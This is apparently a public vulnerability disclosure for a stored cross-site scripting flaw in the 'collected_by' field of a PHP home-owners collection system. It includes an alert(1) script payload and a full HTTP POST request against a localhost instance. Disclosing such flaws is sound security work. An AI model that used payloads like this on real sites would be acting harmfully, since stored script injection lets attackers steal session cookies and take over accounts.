## [Home Owners Collection Management System](https://www.sourcecodester.com/php/15162/home-owners-collection-management-system-phpoop-free-source-code.html)

## [Vendor](https://www.sourcecodester.com/users/tips23)

### Exploit Title:Home Owners Collection Management System -  'collected_by' Stored Cross Site Scripting (XSS)
### Exploit Author: fuuzyap1

### Description:
A Stored Cross Site Scripting (XSS) vulnerability exists in Home Owners Collection Management System 1.0 via the Service List Section in login panel. an attacker can steal the cookies leading to Full Account Takeover.

### Exploit:
Login to the admin panel http://localhost/classes/Master.php?f=save_collection
Navigate to List of Collections and click on edit New button.
Inject the below payload in collected_by parameter

![image](https://user-images.githubusercontent.com/95869214/153041269-7d068b93-6a7b-4e9a-922c-f1b1b24c7a46.png)

![image](https://user-images.githubusercontent.com/95869214/153041503-e9a65bd1-fb93-49a6-8261-51dc2a56c3c8.png)


payload:
```
Sample Collector1231"<sCrIpT>alert(1)</ScRiPt>
```

requests:

```
POST /classes/Master.php?f=save_collection HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------144369869742587923891614191865
Content-Length: 1761
Origin: http://localhost
Connection: close
Referer: http://localhost/admin/?page=collections
Cookie: PHPSESSID=06uv4t86d27aq8auhuohh947s8
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="id"

1
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="date_collected"

2022-02-08
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="collected_by"

Sample Collector1231"<sCrIpT>alert(1)</ScRiPt>
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="member_id"

1
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="fee[3]"

100
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="category_id[3]"

3
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="fee[4]"

100
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="category_id[4]"

4
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="fee[1]"

200
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="category_id[1]"

1
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="fee[5]"

50
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="fee[2]"

200
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="category_id[2]"

2
-----------------------------144369869742587923891614191865
Content-Disposition: form-data; name="total_amount"

600
-----------------------------144369869742587923891614191865--

#### Proof and Exploit:
![image](https://user-images.githubusercontent.com/95869214/153044852-cfaff0e0-ebcc-4e45-9428-69fe810f8ea3.png)

### Impact:
An attacker can able to inject malicious JavaScript code in Service List Section.

